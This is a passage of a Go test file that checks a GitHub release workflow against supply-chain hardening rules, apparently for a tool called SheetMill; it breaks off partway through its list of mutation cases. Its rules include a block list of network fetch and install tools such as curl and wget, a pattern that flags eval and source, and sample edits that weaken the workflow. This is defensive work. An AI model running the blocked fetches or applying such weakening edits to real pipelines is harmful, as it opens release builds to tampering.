// SPDX-License-Identifier: EUPL-1.2

package releaseworkflow

import (
	"bytes"
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"reflect"
	"regexp"
	"sort"
	"strings"
	"testing"

	"go.yaml.in/yaml/v3"
)

type workflow struct {
	On          map[string]any `yaml:"on"`
	Permissions map[string]string
	Concurrency map[string]any
	Jobs        map[string]job
}

type job struct {
	Name            string
	RunsOn          string `yaml:"runs-on"`
	TimeoutMinutes  int    `yaml:"timeout-minutes"`
	Needs           any
	If              any `yaml:"if"`
	ContinueOnError any `yaml:"continue-on-error"`
	Permissions     map[string]string
	Environment     any
	Strategy        struct {
		FailFast bool `yaml:"fail-fast"`
		Matrix   struct {
			Include []map[string]string
		}
	}
	Outputs map[string]string
	Env     map[string]any
	Steps   []step
}

type step struct {
	ID              string
	Name            string
	Uses            string
	Shell           string
	Run             string
	With            map[string]any
	Env             map[string]any
	If              any `yaml:"if"`
	ContinueOnError any `yaml:"continue-on-error"`
}

const (
	checkoutPin = "actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09"
	setupGoPin  = "actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16"
	uploadPin   = "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9"
	downloadPin = "actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333"
	ldflags     = `-ldflags "-X github.com/wstein/sheetmill/internal/cli.Version=$VERSION"`
	dryGuard    = "steps.resolve.outputs.dry_run == 'false'"
)

var (
	allowedUses = map[string]bool{checkoutPin: true, setupGoPin: true, uploadPin: true, downloadPin: true}
	swallowRe   = regexp.MustCompile(`\|\|\s*(true|:)(\s|;|$)`)
	assertRe    = regexp.MustCompile(`^test .* \|\| \{ echo .* >&2; exit 1; \}$`)
	disarmRe    = regexp.MustCompile(`exit 0|set \+e|\|\| echo|\|\| exit`)
	pinRe       = regexp.MustCompile(`^[A-Za-z0-9._-]+/[A-Za-z0-9._-]+@[0-9a-f]{40}$`)
	platforms   = []string{"darwin/arm64", "linux/amd64", "linux/arm64"}
)

func readFile(t *testing.T, rel string) string {
	t.Helper()
	raw, err := os.ReadFile(filepath.Join(repoRoot(t), filepath.FromSlash(rel)))
	if err != nil {
		t.Fatal(err)
	}
	return string(raw)
}

func parse(t *testing.T, raw string) workflow {
	t.Helper()
	var w workflow
	if err := yaml.Unmarshal([]byte(raw), &w); err != nil {
		t.Fatalf("workflow does not parse: %v", err)
	}
	return w
}

func needsOf(v any) []string {
	var out []string
	switch v := v.(type) {
	case string:
		out = append(out, v)
	case []any:
		for _, x := range v {
			out = append(out, fmt.Sprint(x))
		}
	}
	sort.Strings(out)
	return out
}

func targets(j job) []string {
	var out []string
	for _, m := range j.Strategy.Matrix.Include {
		out = append(out, m["os"]+"/"+m["arch"])
	}
	sort.Strings(out)
	return out
}

func stepNamed(j job, prefix string) (step, int) {
	for i, s := range j.Steps {
		if strings.HasPrefix(s.Name, prefix) {
			return s, i
		}
	}
	return step{}, -1
}

func isFalse(v any) bool {
	s := strings.TrimSpace(fmt.Sprint(v))
	return s == "false" || s == "${{ false }}"
}

// violations lists every rule of specs/019-release-workflow FR-1..FR-7 that w breaks.
// Each entry starts with a stable code so the mutation tests can name what they expect.
func violations(w workflow, raw string) []string {
	var v []string
	add := func(code, format string, a ...any) { v = append(v, code+": "+fmt.Sprintf(format, a...)) }

	// Triggers.
	if len(w.On) != 2 {
		add("trigger", "want exactly push and workflow_dispatch, got %v", w.On)
	}
	push, _ := w.On["push"].(map[string]any)
	if !reflect.DeepEqual(push, map[string]any{"tags": []any{"v[0-9]+.[0-9]+.[0-9]+"}}) {
		add("trigger", "push must be exactly the strict tag pattern, got %v", push)
	}
	disp, _ := w.On["workflow_dispatch"].(map[string]any)
	in, _ := disp["inputs"].(map[string]any)
	ver, _ := in["version"].(map[string]any)
	if len(in) != 1 || ver["default"] != "v0.0.0-dryrun" || ver["type"] != "string" {
		add("trigger", "workflow_dispatch must take only the dry-run version input, got %v", disp)
	}

	// Workflow-level settings.
	if !reflect.DeepEqual(w.Permissions, map[string]string{"contents": "read"}) {
		add("permissions", "top level must be contents: read, got %v", w.Permissions)
	}
	if w.Concurrency["group"] != "release-${{ github.ref }}" || w.Concurrency["cancel-in-progress"] != false {
		add("concurrency", "want a per-ref group and cancel-in-progress: false, got %v", w.Concurrency)
	}
	if strings.Contains(raw, "secrets.") {
		add("secrets", "the workflow must not use secrets")
	}
	if strings.Contains(raw, "GH_TOKEN: ") && strings.Count(raw, "GH_TOKEN: ${{ github.token }}") != strings.Count(raw, "GH_TOKEN: ") {
		add("secrets", "GH_TOKEN must be github.token")
	}

	wantJobs := []string{"build", "publish", "smoke", "verify"}
	var gotJobs []string
	for name := range w.Jobs {
		gotJobs = append(gotJobs, name)
	}
	sort.Strings(gotJobs)
	if !reflect.DeepEqual(gotJobs, wantJobs) {
		add("jobs", "want jobs %v, got %v", wantJobs, gotJobs)
	}

	wantPerms := map[string]map[string]string{
		"verify":  {"contents": "read", "actions": "read"},
		"build":   {"contents": "read"},
		"smoke":   {"contents": "read"},
		"publish": {"contents": "write"},
	}
	for name, j := range w.Jobs {
		if !reflect.DeepEqual(j.Permissions, wantPerms[name]) {
			add("permissions", "job %s permissions = %v, want %v", name, j.Permissions, wantPerms[name])
		}
		if j.TimeoutMinutes <= 0 || j.TimeoutMinutes > 30 {
			add("timeout", "job %s needs a timeout of 1..30 minutes, got %d", name, j.TimeoutMinutes)
		}
		if j.ContinueOnError != nil {
			add("continue-on-error", "job %s sets continue-on-error", name)
		}
		if strings.HasSuffix(j.RunsOn, "-latest") {
			add("runner", "job %s uses a floating runner image %s", name, j.RunsOn)
		}
		if name != "publish" && j.Environment != nil {
			add("environment", "only publish may use an environment, job %s does", name)
		}
		if isFalse(j.If) {
			add("if-false", "job %s is disabled with if: false", name)
		}
		for _, s := range j.Steps {
			if s.ContinueOnError != nil {
				add("continue-on-error", "job %s step %q sets continue-on-error", name, s.Name+s.Run)
			}
			if isFalse(s.If) {
				add("if-false", "job %s step %q is disabled", name, s.Name+s.Run)
			}
			if s.Uses != "" {
				if !pinRe.MatchString(s.Uses) {
					add("pin", "job %s uses an unpinned action %s", name, s.Uses)
				}
				if !allowedUses[s.Uses] {
					add("pin", "job %s uses an action outside the allowed list: %s", name, s.Uses)
				}
				if strings.HasPrefix(s.Uses, "actions/checkout@") && s.With["persist-credentials"] != false {
					add("persist-credentials", "job %s checkout must set persist-credentials: false", name)
				}
				if strings.HasPrefix(s.Uses, "actions/upload-artifact@") && name != "build" {
					add("artifact", "only build may upload artifacts, job %s does", name)
				}
				if strings.HasPrefix(s.Uses, "actions/download-artifact@") && name != "smoke" && name != "publish" {
					add("artifact", "only smoke and publish may download artifacts, job %s does", name)
				}
			}
			if s.If != nil && !(name == "verify" && strings.HasPrefix(s.Name, "Require ") && !strings.HasPrefix(s.Name, "Require the repository owner")) {
				add("step-if", "job %s step %q must not be conditional (if: %v)", name, s.Name+s.Run, s.If)
			}
			if strings.Contains(s.Run, "\n") && !strings.HasPrefix(s.Run, "set -euo pipefail\n") {
				add("strict", "job %s multi-line script must start with set -euo pipefail", name)
			}
			for _, line := range strings.Split(s.Run, "\n") {
				line = strings.TrimSpace(line)
				if strings.HasPrefix(line, "test ") && strings.Contains(line, " || ") && !assertRe.MatchString(line) {
					add("swallow", "job %s assertion does not fail the step: %q", name, line)
				}
			}
			if disarmRe.MatchString(s.Run) {
				add("swallow", "job %s script can succeed past a failure (exit 0, set +e, || echo)", name)
			}
			if swallowRe.MatchString(s.Run) {
				add("swallow", "job %s script ignores a failure with || true or || :", name)
			}
			if strings.Contains(s.Run, "${{") {
				add("injection", "job %s interpolates an expression inside a run script; pass it through env", name)
			}
			for _, banned := range []string{"curl ", "wget ", "pip ", "npm ", "go install", "apt-get", "brew "} {
				if strings.Contains(s.Run, banned) {
					add("download", "job %s run script fetches or installs a tool (%s)", name, strings.TrimSpace(banned))
				}
			}
		}
	}
	if regexp.MustCompile(`(?m)^\s*(?:- )?uses:\s*\S+@(?:v\d|main|master)\b`).MatchString(raw) {
		add("pin", "a uses: line names a mutable ref")
	}
	if regexp.MustCompile(`(?m)^\s*(?:- )?uses: \S+@[0-9a-f]{40}\s*$`).MatchString(raw) {
		add("pin", "a pinned uses: line lacks its version comment")
	}

	verify, build, smoke, publish := w.Jobs["verify"], w.Jobs["build"], w.Jobs["smoke"], w.Jobs["publish"]

	// verify: ordered conditions and always-on gates.
	order := []string{"Resolve the version", "Require the repository owner", "Require an annotated tag", "Require a green check run", "Require that no release exists"}
	last := -1
	for _, prefix := range order {
		s, i := stepNamed(verify, prefix)
		switch {
		case i < 0:
			add("verify", "missing step %q", prefix)
		case i < last:
			add("verify", "step %q is out of order", prefix)
		default:
			last = i
			if prefix == order[1] && s.If != nil {
				add("verify", "the owner check must run on every run kind, it has if: %v", s.If)
			} else if prefix != order[0] && prefix != order[1] && s.If != "${{ "+dryGuard+" }}" && s.If != dryGuard {
				add("verify", "step %q must run exactly on real tag runs (if: %s), got %v", prefix, dryGuard, s.If)
			}
		}
	}
	wantActor := map[string]any{"ACTOR": "${{ github.triggering_actor }}", "PUSHER": "${{ github.actor }}", "OWNER": "${{ github.repository_owner }}"}
	if s, i := stepNamed(verify, "Require the repository owner"); i >= 0 && (!strings.Contains(s.Run, `test "$ACTOR" = "$OWNER" ||`) || !reflect.DeepEqual(s.Env, wantActor)) {
		add("verify", "the verify owner check is missing or its ACTOR/OWNER env changed: %v", s.Env)
	}
	if s, i := stepNamed(verify, "Require an annotated tag"); i >= 0 {
		for _, want := range []string{"git fetch --force --no-tags", `'+refs/heads/main:refs/remotes/origin/main'`, `release-verify.sh tag "$TAG" refs/remotes/origin/main`, `test "$commit" = "$GITHUB_SHA"`, `+refs/tags/$TAG:refs/tags/$TAG`} {
			if !strings.Contains(s.Run, want) {
				add("verify", "annotated tag step lacks %q", want)
			}
		}
	}
	if s, i := stepNamed(verify, "Require a green check run"); i >= 0 {
		for _, want := range []string{"workflows/check.yml/runs", "head_sha=$GITHUB_SHA", "event=push", `.conclusion == "success"`, `test "$n" -ge 1`} {
			if !strings.Contains(s.Run, want) {
				add("verify", "check run step lacks %q", want)
			}
		}
	}
	if s, i := stepNamed(verify, "Require that no release exists"); i >= 0 {
		for _, want := range []string{"releases/tags/$TAG", "if out=$(gh api", "already exists\" >&2\n  exit 1\nfi", `*"HTTP 404"*) echo`, `*) echo "cannot tell whether a release exists: $out" >&2; exit 1 ;;`} {
			if !strings.Contains(s.Run, want) {
				add("verify", "release existence step lacks %q", want)
			}
		}
	}
	gates := map[string]bool{"sh .github/scripts/release-verify.sh go": false, "make check": false, "make mod-verify": false, "make test-assets": false}
	for _, s := range verify.Steps {
		if _, ok := gates[s.Run]; ok {
			gates[s.Run] = true
			if s.If != nil {
				add("gate", "gate %q must run on every run kind, it has if: %v", s.Run, s.If)
			}
		}
	}
	for g, ok := range gates {
		if !ok {
			add("gate", "verify lacks the gate %q", g)
		}
	}
	if !reflect.DeepEqual(verify.Outputs, map[string]string{
		"version": "${{ steps.resolve.outputs.version }}", "dry_run": "${{ steps.resolve.outputs.dry_run }}", "commit": "${{ steps.resolve.outputs.commit }}"}) {
		add("verify", "verify outputs changed: %v", verify.Outputs)
	}
	if s, i := stepNamed(verify, "Resolve the version"); i >= 0 {
		for _, want := range []string{`[ "$EVENT_NAME" = push ] && [ "$REF_TYPE" = tag ]`, "release-verify.sh version", "release-verify.sh dryversion", "dry_run=true", "dry_run=false"} {
			if !strings.Contains(s.Run, want) {
				add("verify", "resolve step lacks %q", want)
			}
		}
	}
	if !reflect.DeepEqual(needsOf(verify.Needs), []string(nil)) {
		add("needs", "verify must have no needs")
	}

	// build.
	if !reflect.DeepEqual(targets(build), platforms) {
		add("matrix", "build matrix = %v, want exactly %v", targets(build), platforms)
	}
	if !reflect.DeepEqual(needsOf(build.Needs), []string{"verify"}) {
		add("needs", "build must need verify, got %v", needsOf(build.Needs))
	}
	if s, i := stepNamed(build, "Build smill"); i < 0 {
		add("build", "missing build step")
	} else {
		if strings.Count(s.Run, "go build -trimpath "+ldflags) != 2 {
			add("ldflags", "both builds must use -trimpath and the version ldflags")
		}
		for k, want := range map[string]string{"CGO_ENABLED": "0", "GOTOOLCHAIN": "local", "GOFLAGS": "-mod=readonly", "GOOS": "${{ matrix.os }}", "GOARCH": "${{ matrix.arch }}", "VERSION": "${{ needs.verify.outputs.version }}"} {
			if s.Env[k] != want {
				add("build", "env %s = %v, want %q", k, s.Env[k], want)
			}
		}
		if s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || !strings.Contains(s.Run, `test "$(git rev-parse HEAD)" = "$COMMIT" ||`) {
			add("build", "the build must assert that the checkout is the verified commit")
		}
		if !strings.Contains(s.Run, "GOCACHE=") || !strings.Contains(s.Run, `cmp "$RUNNER_TEMP/bin/smill" "$RUNNER_TEMP/bin/smill-second"`) {
			add("reproducibility", "the second build with a fresh cache and the cmp are missing")
		}
	}
	for _, s := range build.Steps {
		if strings.HasPrefix(s.Uses, "actions/setup-go@") && s.With["cache"] != false {
			add("build", "build must set cache: false")
		}
		if strings.HasPrefix(s.Uses, "actions/upload-artifact@") {
			if s.With["name"] != "release-${{ matrix.os }}-${{ matrix.arch }}" || s.With["retention-days"] != 1 || s.With["if-no-files-found"] != "error" {
				add("artifact", "upload options changed: %v", s.With)
			}
		}
	}
	if s, i := stepNamed(build, "Package the archive"); i < 0 || !strings.Contains(s.Run, "SOURCE_DATE_EPOCH=$(git log -1 --format=%ct) sh .github/scripts/release-package.sh") {
		add("archive", "the package step must call release-package.sh with the commit time")
	}

	// smoke.
	wantSmoke := map[string]string{"linux/amd64": "ubuntu-24.04", "linux/arm64": "ubuntu-24.04-arm", "darwin/arm64": "macos-15"}
	gotSmoke := map[string]string{}
	for _, m := range smoke.Strategy.Matrix.Include {
		gotSmoke[m["os"]+"/"+m["arch"]] = m["runner"]
	}
	if !reflect.DeepEqual(gotSmoke, wantSmoke) || smoke.RunsOn != "${{ matrix.runner }}" {
		add("matrix", "smoke runners = %v on %q, want %v", gotSmoke, smoke.RunsOn, wantSmoke)
	}
	if !reflect.DeepEqual(targets(smoke), platforms) {
		add("matrix", "smoke matrix = %v, want exactly %v", targets(smoke), platforms)
	}
	if !reflect.DeepEqual(needsOf(smoke.Needs), []string{"build", "verify"}) {
		add("needs", "smoke must need verify and build, got %v", needsOf(smoke.Needs))
	}
	for _, s := range smoke.Steps {
		if strings.HasPrefix(s.Uses, "actions/download-artifact@") && (s.With["name"] != "release-${{ matrix.os }}-${{ matrix.arch }}" || s.With["path"] != "${{ runner.temp }}/dist") {
			add("artifact", "smoke must download its own target's artifact: %v", s.With)
		}
	}
	if s, i := stepNamed(smoke, "Smoke-test"); i >= 0 && (s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || !strings.Contains(s.Run, `test "$(git rev-parse HEAD)" = "$COMMIT" ||`)) {
		add("smoke", "the smoke step must assert that the checkout is the verified commit")
	}
	if s, i := stepNamed(smoke, "Smoke-test"); i < 0 || !strings.Contains(s.Run, "sh .github/scripts/release-smoke.sh ") || !strings.Contains(s.Run, `release-smoke.sh "$VERSION" "$RUNNER_TEMP/dist/smill_${plain}_${OS}_${ARCH}.tar.gz" "$GITHUB_WORKSPACE"`) {
		add("archive", "the smoke step must run release-smoke.sh on the archive named smill_<version>_<os>_<arch>.tar.gz")
	}

	// publish.
	if !reflect.DeepEqual(needsOf(publish.Needs), []string{"build", "smoke", "verify"}) {
		add("needs", "publish must need verify, build and smoke, got %v", needsOf(publish.Needs))
	}
	if publish.Environment != "release" {
		add("environment", "publish must use environment: release, got %v", publish.Environment)
	}
	if publish.If != "needs.verify.outputs.dry_run == 'false' && github.event_name == 'push' && github.ref_type == 'tag'" {
		add("publish-if", "publish must run only for real tag pushes, got %v", publish.If)
	}
	if s, i := stepNamed(publish, "Create the release"); i < 0 {
		add("publish", "missing release step")
	} else {
		for _, want := range []string{
			`gh release create "$TAG" --repo "$REPO" --verify-tag --title "SheetMill $TAG" --notes-file "$RUNNER_TEMP/notes.md"`,
			`"$RUNNER_TEMP"/dist/smill_*.tar.gz "$RUNNER_TEMP/dist/SHA256SUMS"`,
			`git ls-remote "https://github.com/$REPO" "refs/tags/$TAG^{}"`,
			"| cut -f1)\ntest \"$remote\" = \"$COMMIT\" ||",
			`test "$ACTOR" = "$OWNER" ||`,
			`test "$(git rev-parse HEAD)" = "$COMMIT"`,
			`select(.tag_name ==`,
			`test -z "$existing"`,
			"sha256sum --check SHA256SUMS",
			"release-notes.sh",
			`test "$(ls -1 -- *.tar.gz | wc -l)" -eq 3`,
		} {
			if !strings.Contains(s.Run, want) {
				add("publish", "release step lacks %q", want)
			}
		}
		if strings.Count(s.Run, "--draft") != 1 || !strings.Contains(s.Run, `if [ "$DRAFT" = true ]; then flags+=(--draft); fi`) {
			add("draft", "--draft must appear once, only under the DRAFT switch")
		}
		if s.Env["DRAFT"] != "${{ vars.SHEETMILL_RELEASE_DRAFT }}" {
			add("draft", "the draft switch must be the SHEETMILL_RELEASE_DRAFT variable, got %v", s.Env["DRAFT"])
		}
		if s.Env["PUSHER"] != "${{ github.actor }}" || s.Env["ACTOR"] != "${{ github.triggering_actor }}" || s.Env["OWNER"] != "${{ github.repository_owner }}" || s.Env["COMMIT"] != "${{ needs.verify.outputs.commit }}" || s.Env["TAG"] != "${{ needs.verify.outputs.version }}" {
			add("publish", "publish ACTOR/OWNER/COMMIT/TAG env changed: %v", s.Env)
		}
		if s.Env["GH_TOKEN"] != "${{ github.token }}" {
			add("secrets", "publish must use github.token")
		}
	}
	for _, s := range publish.Steps {
		if strings.HasPrefix(s.Uses, "actions/checkout@") && (s.With["fetch-depth"] != 0 || s.With["ref"] != nil) {
			add("publish", "publish needs full history for the release notes and must check out the tag ref (no ref override)")
		}
		if strings.HasPrefix(s.Uses, "actions/download-artifact@") && (s.With["pattern"] != "release-*" || s.With["merge-multiple"] != true) {
			add("publish", "publish must download exactly the release-* artifacts merged: %v", s.With)
		}
	}
	for _, s := range verify.Steps {
		if strings.HasPrefix(s.Uses, "actions/checkout@") && s.With["fetch-depth"] != 0 {
			add("verify", "verify needs full history to check ancestry")
		}
	}
	semantic(w, add)
	sort.Strings(v)
	return v
}

var (
	urlRe = regexp.MustCompile(`https?://[^\s"']*`)
	// Variables a step may assign at most once, and only from a command substitution.
	computedVars = map[string]int{"n": 1, "remote": 1, "existing": 1, "commit": 1}
	// Variables that carry a trust decision and must never be assigned inside a script.
	protectedVars = []string{"ACTOR", "OWNER", "PUSHER", "COMMIT", "TAG", "REPO", "VERSION", "GITHUB_SHA", "EVENT_NAME", "REF_TYPE", "REF_NAME", "INPUT_VERSION", "OS", "ARCH", "DRAFT"}
	badCmdRe      = regexp.MustCompile(`(^|[\s;&|(])(eval|export|declare|typeset|unset|alias|source|\.)\s`)
	allowedWith   = map[string][]string{
		"actions/checkout":          {"fetch-depth", "persist-credentials"},
		"actions/setup-go":          {"go-version-file", "check-latest", "cache"},
		"actions/upload-artifact":   {"name", "path", "retention-days", "if-no-files-found"},
		"actions/download-artifact": {"name", "path", "pattern", "merge-multiple"},
	}
)

// semantic holds rules about what the scripts and steps mean, independent of the golden file.
func semantic(w workflow, add func(code, format string, a ...any)) {
	for name, j := range w.Jobs {
		if j.Env != nil {
			add("env", "job %s must not set env", name)
		}
		for _, s := range j.Steps {
			label := name + "/" + s.Name + s.Run
			if s.Uses != "" {
				base := s.Uses[:strings.Index(s.Uses, "@")]
				allowed := map[string]bool{}
				for _, k := range allowedWith[base] {
					allowed[k] = true
				}
				for k := range s.With {
					if !allowed[k] {
						add("with", "job %s: %s may not set %q", name, base, k)
					}
				}
				if s.Env != nil {
					add("env", "job %s: %s may not set env", name, base)
				}
				if base == "actions/setup-go" && (s.With["go-version-file"] != ".go-version" || s.With["check-latest"] != false) {
					add("with", "job %s: setup-go must read .go-version with check-latest: false", name)
				}
				continue
			}
			// A bare gate (make or a repository script) carries no env.
			if (strings.HasPrefix(s.Run, "make ") || strings.HasPrefix(s.Run, "sh .github/scripts/")) && !strings.Contains(s.Run, "\n") && s.Env != nil {
				add("env", "gate %q must not set env: %v", s.Run, s.Env)
			}
			for _, u := range urlRe.FindAllString(s.Run, -1) {
				if u != "https://github.com/$REPO" {
					add("url", "%s fetches %q; only https://github.com/$REPO is allowed", label, u)
				}
			}
			if badCmdRe.MatchString(s.Run) {
				add("assign", "%s uses eval, export, source or a similar command", label)
			}
			for _, p := range protectedVars {
				if regexp.MustCompile(`(^|[\s;&(|])` + p + `=`).MatchString(s.Run) {
					add("assign", "%s assigns %s inside a script", label, p)
				}
			}
			for v := range computedVars {
				re := regexp.MustCompile(`(^|[\s;&(|])` + v + `=`)
				n := len(re.FindAllString(s.Run, -1))
				sub := len(regexp.MustCompile(`(^|[\s;&(|])`+v+`=\$\(`).FindAllString(s.Run, -1))
				if n > 1 || n != sub {
					add("assign", "%s assigns %s more than once or not from a command substitution", label, v)
				}
			}
			for _, banned := range []string{"\ncp ", "\nmv ", "\nln ", "\ndd ", "\ntouch "} {
				if name == "build" && strings.Contains("\n"+s.Run, banned) {
					add("reproducibility", "build must not copy or move binaries between the builds (%q)", strings.TrimSpace(banned))
				}
			}
		}
	}
	// Exact lines that carry the decisions.
	need := func(job, prefix string, lines ...string) {
		st, i := stepNamed(w.Jobs[job], prefix)
		if i < 0 {
			add("semantic", "job %s lacks step %q", job, prefix)
			return
		}
		var have []string
		for _, l := range strings.Split(st.Run, "\n") {
			have = append(have, strings.TrimSpace(l))
		}
		for _, l := range lines {
			if !strings.Contains("\n"+strings.Join(have, "\n")+"\n", "\n"+l+"\n") {
				add("semantic", "job %s step %q lacks the exact line %q", job, prefix, l)
			}
		}
	}
	need("verify", "Require the repository owner",
		`test "$ACTOR" = "$OWNER" || { echo "run started by $ACTOR, not by the repository owner $OWNER" >&2; exit 1; }`,
		`test "$PUSHER" = "$OWNER" || { echo "run originally started by $PUSHER, not by the repository owner $OWNER" >&2; exit 1; }`)
	need("publish", "Create the release",
		`test "$ACTOR" = "$OWNER" || { echo "run triggered by $ACTOR, not by the repository owner $OWNER" >&2; exit 1; }`,
		`test "$PUSHER" = "$OWNER" || { echo "run originally started by $PUSHER, not by the repository owner $OWNER" >&2; exit 1; }`,
		`test "$(wc -l < SHA256SUMS)" -eq 3`,
		"cat -- *.tar.gz.sha256 | LC_ALL=C sort -k2 > SHA256SUMS")
	need("verify", "Resolve the version", `echo "commit=$GITHUB_SHA"`)
	need("verify", "Require a green check run", `test "$n" -ge 1 || { echo "no successful check run on push for $GITHUB_SHA; re-run check for that commit first" >&2; exit 1; }`)
	need("build", "Build smill", `GOCACHE="$RUNNER_TEMP/gocache-second" go build -trimpath `+ldflags+` -o "$RUNNER_TEMP/bin/smill-second" ./cmd/smill`)
}

// canonical renders the whole workflow (comments dropped) as indented JSON with sorted keys.
func canonical(raw string) (string, error) {
	var doc any
	if err := yaml.Unmarshal([]byte(raw), &doc); err != nil {
		return "", err
	}
	b, err := json.Marshal(normalize(doc))
	if err != nil {
		return "", err
	}
	var out bytes.Buffer
	if err := json.Indent(&out, b, "", "  "); err != nil {
		return "", err
	}
	return out.String() + "\n", nil
}

func normalize(v any) any {
	switch v := v.(type) {
	case map[string]any:
		m := map[string]any{}
		for k, x := range v {
			m[k] = normalize(x)
		}
		return m
	case map[any]any:
		m := map[string]any{}
		for k, x := range v {
			m[fmt.Sprint(k)] = normalize(x)
		}
		return m
	case []any:
		for i := range v {
			v[i] = normalize(v[i])
		}
	}
	return v
}

// goldenDiff compares the workflow with testdata/release.golden.json. Every run script,
// env, with, if and matrix is pinned there, so an edit to any of them is a reviewed change:
// set UPDATE_RELEASE_GOLDEN=1 and run the tests, then read the diff of the golden file.
func goldenDiff(raw string) string {
	got, err := canonical(raw)
	if err != nil {
		return "workflow does not parse: " + err.Error()
	}
	path := filepath.Join("testdata", "release.golden.json")
	want, err := os.ReadFile(path)
	if err != nil {
		return "golden file missing: " + err.Error()
	}
	if got != string(want) {
		gl, wl := strings.Split(got, "\n"), strings.Split(string(want), "\n")
		for i := 0; i < len(gl) && i < len(wl); i++ {
			if gl[i] != wl[i] {
				return fmt.Sprintf("workflow differs from the golden file at line %d: have %q, golden %q", i+1, gl[i], wl[i])
			}
		}
		return "workflow differs from the golden file in length"
	}
	return ""
}

// The golden file is a CHANGE DETECTOR: it makes every edit of the workflow a reviewed
// diff. It is not a safety proof, and anyone can regenerate it, so the semantic rules in
// violations() are what the mutation tests rely on. To accept an intended change run the
// tests with UPDATE_RELEASE_GOLDEN=1; the run writes the file and then always fails, and it
// refuses to write when CI is set, so a pass never follows an update.
func TestReleaseWorkflowMatchesGolden(t *testing.T) {
	raw := readFile(t, ".github/workflows/release.yml")
	if os.Getenv("UPDATE_RELEASE_GOLDEN") == "1" {
		if os.Getenv("CI") != "" {
			t.Fatal("refusing to update the golden file in CI")
		}
		got, err := canonical(raw)
		if err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(filepath.Join("testdata", "release.golden.json"), []byte(got), 0o644); err != nil {
			t.Fatal(err)
		}
		t.Fatal("golden file updated; read its diff, then re-run without UPDATE_RELEASE_GOLDEN")
	}
	if g := goldenDiff(raw); g != "" {
		t.Fatal(g)
	}
}

func TestReleaseWorkflowHasNoViolations(t *testing.T) {
	raw := readFile(t, ".github/workflows/release.yml")
	if v := violations(parse(t, raw), raw); len(v) != 0 {
		t.Fatalf("release.yml breaks its own rules:\n%s", strings.Join(v, "\n"))
	}
}

func TestReleaseWorkflowHeaderRecordsTheAuthorization(t *testing.T) {
	raw := readFile(t, ".github/workflows/release.yml")
	var header []string
	for _, line := range strings.Split(raw, "\n") {
		if !strings.HasPrefix(line, "#") {
			break
		}
		header = append(header, line)
	}
	h := strings.Join(header, "\n")
	for _, want := range []string{"SPDX-License-Identifier: EUPL-1.2", "2026-10-17", "specs/019-release-workflow", "dry run"} {
		if !strings.Contains(h, want) {
			t.Errorf("header comment lacks %q:\n%s", want, h)
		}
	}
}

// Each weakening must be caught by the named rule: the test pins the workflow against
// edits that would quietly remove a gate.
func TestWeakeningTheWorkflowIsCaught(t *testing.T) {
	raw := readFile(t, ".github/workflows/release.yml")
	cases := []struct {
		name, old, new, code string
		all                  bool
	}{
		{"widen tag pattern to v*", `tags: ['v[0-9]+.[0-9]+.[0-9]+']`, `tags: ['v*']`, "trigger", false},
		{"allow pre-release tags", `tags: ['v[0-9]+.[0-9]+.[0-9]+']`, `tags: ['v[0-9]+.[0-9]+.[0-9]+', 'v[0-9]+.[0-9]+.[0-9]+-*']`, "trigger", false},
		{"publish on branch pushes", "  push:\n    tags:", "  push:\n    branches: [main]\n    tags:", "trigger", false},
		{"pull_request trigger added", "  workflow_dispatch:\n", "  pull_request:\n  workflow_dispatch:\n", "trigger", false},
		{"publish always", "    if: needs.verify.outputs.dry_run == 'false' &&", "    if: always() && needs.verify.outputs.dry_run == 'false' &&", "publish-if", false},
		{"publish pusher check removed", "          test \"$ACTOR\" = \"$OWNER\" || { echo \"run triggered", "          true || { echo \"run triggered", "publish", false},
		{"draft duplicate check removed", "          test -z \"$existing\" ||", "          true ||", "publish", false},
		{"top-level write", "permissions:\n  contents: read\nconcurrency:", "permissions:\n  contents: write\nconcurrency:", "permissions", false},
		{"build gains write", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: read", "  build:\n    name: build (${{ matrix.os }}/${{ matrix.arch }})\n    needs: verify\n    runs-on: ubuntu-24.04\n    timeout-minutes: 20\n    permissions:\n      contents: write", "permissions", false},
		{"publish gains id-token", "    permissions:\n      contents: write\n", "    permissions:\n      contents: write\n      id-token: write\n", "permissions", false},
		{"publish loses write", "    permissions:\n      contents: write\n", "    permissions:\n      contents: read\n", "permissions", false},
		{"verify loses actions read", "      contents: read\n      actions: read\n", "      contents: read\n", "permissions", false},
		{"mutable action ref", "actions/setup-go@924ae3a1cded613372ab5595356fb5720e22ba16 # v6", "actions/setup-go@v6", "pin", true},
		{"missing version comment", "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2", "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9", "pin", false},
		{"unlisted action", "actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9", "actions/upload-artifact@0000000000000000000000000000000000000000", "pin", false},
		{"persisted credentials", "          fetch-depth: 0\n          persist-credentials: false\n      - uses: actions/setup-go", "          fetch-depth: 0\n      - uses: actions/setup-go", "persist-credentials", false},
		{"gate continue-on-error", "      - run: make check\n", "      - run: make check\n        continue-on-error: true\n", "continue-on-error", false},
		{"gate disabled", "      - run: make mod-verify\n", "      - if: false\n        run: make mod-verify\n", "if-false", false},
		{"gate made conditional", "      - run: make test-assets\n", "      - if: github.event_name == 'push'\n        run: make test-assets\n", "gate", false},
		{"gate removed", "      - run: make test-assets\n", "", "gate", false},
		{"job continue-on-error", "  smoke:\n    name:", "  smoke:\n    continue-on-error: true\n    name:", "continue-on-error", false},
		{"build gains a platform", "          - os: darwin\n            arch: arm64\n    steps:\n      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          persist-credentials: false\n      - uses: actions/setup-go", "          - os: darwin\n            arch: arm64\n          - os: windows\n            arch: amd64\n    steps:\n      - uses: actions/checkout@fbc6f3992d24b796d5a048ff273f7fcc4a7b6c09 # v5\n        with:\n          persist-credentials: false\n      - uses: actions/setup-go", "matrix", false},
